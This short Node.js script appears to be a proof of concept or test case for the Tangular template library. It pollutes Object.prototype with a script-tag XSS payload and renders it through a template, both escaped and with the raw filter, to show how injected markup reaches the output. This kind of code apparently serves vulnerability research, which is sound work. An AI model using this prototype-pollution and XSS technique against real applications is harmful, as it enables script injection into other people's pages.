// Tangular custom helper feature
const path = require('path');
const fs = require('fs');
require('tangular');

try{
  Object._expose.setupSymbols()
}
catch(e){
  console.log("[!] symbolic execution not enabled")
}

Object.prototype["name"] = "<script>alter(1)</script>"

var template = Tangular.compile('Hello {{name}} and {{name | raw}}!');

var output = template({ name: 'Peter' });

console.log(output)